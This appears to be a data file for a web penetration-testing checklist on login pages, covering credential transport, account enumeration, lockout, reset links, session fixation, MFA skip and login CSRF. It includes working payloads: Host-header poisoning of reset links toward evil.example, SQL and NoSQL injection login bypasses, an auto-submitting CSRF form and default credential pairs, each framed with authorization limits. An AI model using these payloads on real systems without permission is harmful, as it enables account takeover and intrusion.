title: Login / identity page
summary: Credential transport, account enumeration, lockout, Host-poisoned reset links, MFA skip, and session fixation. Use only designated accounts.

groups.title: Credential transport
groups.summary: How the secret travels and whether it leaks into URLs, logs, or referrers.

checks.title: Credentials only over TLS
checks.why: A login POST on HTTP, or an HTTPS form whose action is http://, exposes the password.
checks.validate: The password is observable on a plaintext request or in a Referer to another origin.

variants.name: Form action and autocomplete
variants.payload:
<form action="https://www.example.com/login" method="post" autocomplete="off">
  <input type="password" name="password" autocomplete="current-password">
</form>
variants.expect: action must be HTTPS or relative. Watch the actual request, not the HTML, in case JS rewrites it.
variants.why: The login form's action and autocomplete reveal whether credentials can travel over plaintext or persist.

variants.name: Password in the query string
variants.payload:
GET /login?user=tester&password=ChangeMe1! HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: Must not authenticate. If the app accepts GET login, the secret is in logs, history, and Referer.
variants.why: A password submitted in the query string leaks into logs, history, and Referer.

checks.title: Default and seeded accounts
checks.why: Vendor defaults and demo users still authenticate on the confirmed product.
checks.validate: A documented default account issues a session. Do not spray; use the product's own list.

variants.name: Documented vendor pairs
variants.payload:
admin / admin
admin / password
admin / Password1
administrator / administrator
root / root
test / test
guest / guest
variants.expect: Only the pairs the vendor documents for this product. One try each, then stop.
variants.why: Default vendor credentials are only testable where the product documents them and the client authorises it.

variants.name: Seeded demo users
variants.payload:
demo / demo
user / user
cs / cs
support / support
variants.expect: Same rule: only names this product ships. A successful login on a leftover demo account is the finding.
variants.why: Seeded demo accounts with known credentials are a common initial-access path.

groups.title: Enumeration and lockout
groups.summary: Whether login, register, and reset disclose which accounts exist, and whether lockout is real.

checks.title: Account enumeration
checks.why: Different status, body, or timing for a known vs unknown account.
checks.validate: Responses distinguish existing from non-existing accounts consistently across repeats.

variants.name: Login — known vs unknown
variants.payload:
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=known.user%40example.com&password=wrong
variants.expect: Compare with username=no.such.user@example.com. Diff status, Location, body length, and JSON error code.
variants.why: A different response for a valid username is the classic enumeration signal.

variants.name: Password reset
variants.payload:
POST /forgot-password HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=known.user%40example.com
variants.expect: "If the account exists…" for both, or a distinguishable message/timing for the known address.
variants.why: Reset responses can reveal whether an account exists.

variants.name: Registration
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"email":"known.user@example.com","password":"ChangeMe1!"}
variants.expect: "Email already registered" vs a generic failure. Same comparison on username.
variants.why: 'Taken' vs 'available' on registration enumerates the user base.

checks.title: Lockout and stuffing controls
checks.why: Guessing continues past the documented threshold, or lockout is a DoS against another user.
checks.validate: A bounded burst either is stopped, or it is not. Do not brute-force.

variants.name: Five failed logins, one account
variants.payload: Repeat the wrong-password POST five to ten times against YOUR test account only.
variants.expect: Captcha, backoff, or lockout. If nothing happens, record the count and stop.
variants.why: A small burst on one account tests lockout without a wide brute force.

variants.name: Lockout as DoS
variants.payload: Do not lock a real user. If the policy is per-account and has no unlock, note the DoS risk without triggering it against anyone else.
variants.expect: Per-account lockout without a self-service unlock is a finding only with owner approval to demonstrate.
variants.why: An unauthenticated attacker locking out a real user is a denial-of-service finding.

groups.title: Reset links and session
groups.summary: Host-poisoned reset URLs, token reuse, and pre-auth session fixation.

checks.title: Host-poisoned reset / invite link
checks.why: The reset email is built from Host or X-Forwarded-Host, so the token is delivered to an attacker origin.
checks.validate: The mail contains a working token URL whose host is one you control. Use a disposable account and inbox.

variants.name: Arbitrary Host on forgot-password
variants.payload:
POST /forgot-password HTTP/1.1
Host: evil.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=tester%40example.com
variants.expect: The email must still point at the canonical origin. If it points at evil.example, that is the finding.
variants.why: A poisoned Host in the reset link sends the reset request to an attacker host.

variants.name: X-Forwarded-Host on forgot-password
variants.payload:
POST /forgot-password HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=tester%40example.com
variants.expect: Same check. Also try X-Forwarded-Proto: http and Forwarded: host=evil.example.
variants.why: An unauthenticated X-Forwarded-Host can override the authority used in the reset URL.

variants.name: Duplicate Host
variants.payload:
POST /forgot-password HTTP/1.1
Host: www.example.com
Host: evil.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=tester%40example.com
variants.expect: Edge and app must agree. The mail host is the evidence, not the HTTP response.
variants.why: Front-end/back-end disagreement on duplicate Host values can poison the generated link.

checks.title: Reset token properties
checks.why: Predictable, reusable, or cross-account tokens take over the inbox-holder's account.
checks.validate: The same token works twice, for another account, or is guessable from a small sample.

variants.name: Reuse after first use
variants.payload: Request a reset, complete it, then replay the same URL.
variants.expect: Second use must fail. Also try the token against a second account you control.
variants.why: A reset token that works twice means it is not consumed.

variants.name: Token in Referer
variants.payload: Open the reset link, then click any third-party resource on the page and inspect Referer.
variants.expect: The token must not leave the origin.
variants.why: A token leaked through Referer to a third-party resource is reusable.

checks.title: Session fixation / rotation
checks.why: A pre-login cookie that survives authentication lets an attacker plant the session.
checks.validate: The session identifier issued before login is still accepted after login.

variants.name: Compare pre- and post-login cookies
variants.payload: Note Set-Cookie on GET /login, submit credentials, compare the cookie name and value.
variants.expect: Value must change. A new name with the old value still counting is the same bug.
variants.why: The session id must rotate on login; a stable id across auth is the fixation primitive.

variants.name: Planted cookie
variants.payload:
POST /login HTTP/1.1
Host: www.example.com
Cookie: session=wapt-planted-value
Content-Type: application/x-www-form-urlencoded

username=tester&password=ChangeMe1!
variants.expect: The planted value must not become the authenticated session.
variants.why: Accepting a pre-set session cookie after login means the server did not issue a fresh one.

checks.title: MFA completion skip
checks.why: Step one succeeds, then the post-MFA URL works without the second factor.
checks.validate: An authenticated session is issued without a valid OTP, push, or WebAuthn assertion.

variants.name: Direct post-MFA request
variants.payload: Complete username/password, capture the next request, drop the OTP field, and send it.
variants.expect: Must stay in the MFA step. Also try the destination URL the UI would have loaded after MFA.
variants.why: Accessing the protected resource directly after login but before MFA proves MFA can be skipped.

variants.name: Reuse a just-used OTP
variants.payload: Submit the current TOTP twice in two sessions.
variants.expect: Second use must fail inside the validity window.
variants.why: A reusable OTP means a captured code is a permanent bypass.

checks.title: Login CSRF
checks.why: A cross-site POST logs the victim into the attacker's account so later activity is attacker-visible.
checks.validate: A cross-origin form login succeeds in the victim browser and a later action is bound to the attacker account.

variants.name: Cross-site login form
variants.payload:
<form action="https://www.example.com/login" method="POST">
  <input name="username" value="attacker@example.com">
  <input name="password" value="ChangeMe1!">
</form>
<script>document.forms[0].submit()</script>
variants.expect: Must fail without a valid CSRF token / SameSite=Strict session. Impact needs a follow-on action, not just a 200.
variants.why: Logging a victim into an attacker account primes them for abuse of CSRF-free actions.

variants.name: JSON login as text/plain
variants.payload:
POST /api/login HTTP/1.1
Host: www.example.com
Content-Type: text/plain
Origin: https://evil.example

{"username":"attacker@example.com","password":"ChangeMe1!"}
variants.expect: A JSON-only login that also parses text/plain is CSRF-simple. Must reject or require a custom header.
variants.why: A simple-request JSON login can be submitted cross-site without a preflight.

checks.title: SQL injection on login
checks.why: Username or password is concatenated into a SQL string, so a quote changes the authentication result.
checks.validate: A boolean or comment payload authenticates without the real password, or produces a consistent SQL error differential. Use your test account only.

variants.name: Classic comment bypass
variants.payload:
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=tester%27--+&password=x
variants.expect: Must not issue a session. Also try tester' OR '1'='1' -- and admin'/*.
variants.why: A comment-terminated username bypasses the password check in string-concatenated queries.

variants.name: JSON boolean pair
variants.payload:
POST /api/login HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"username":"tester' AND '1'='1","password":"wrong"}
variants.expect: Compare with AND '1'='2. A stable differential or a successful login is the finding. Do not dump users.
variants.why: Boolean differentials in the JSON body confirm injection without dumping data.

checks.title: NoSQL operator injection on login
checks.why: JSON login accepts $ne / $gt so password:{$ne:""} authenticates as that user.
checks.validate: A JSON operator payload issues a session for your test account without the real password.

variants.name: password $ne
variants.payload:
POST /api/login HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"username":"tester","password":{"$ne":""}}
variants.expect: Must 401. A session for tester is the finding. Also try {"$gt":""}.
variants.why: A $ne operator returns the first document when the password comparison is skipped.

variants.name: Bracket operators
variants.payload:
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=tester&password[$ne]=
variants.expect: qs parsers turn this into operators. Must not authenticate.
variants.why: qs-style bracket operators turn ordinary fields into NoSQL operators.

poisoned-host.purpose: A poisoned Host in the reset link sends the reset request to an attacker host.
poisoned-host.payload:
POST /forgot-password HTTP/1.1
Host: evil.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=tester%40example.com

poisoned-xfh.purpose: An unauthenticated X-Forwarded-Host can override the authority used in the reset URL.
poisoned-xfh.payload:
POST /forgot-password HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=tester%40example.com

sqli-comment.purpose: A comment-terminated username bypasses the password check in string-concatenated queries.
sqli-comment.payload:
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=tester%27--+&password=x

sqli-boolean-json.purpose: Boolean differentials in the JSON body confirm injection without dumping data.
sqli-boolean-json.payload:
POST /api/login HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"username":"tester' AND '1'='1","password":"wrong"}
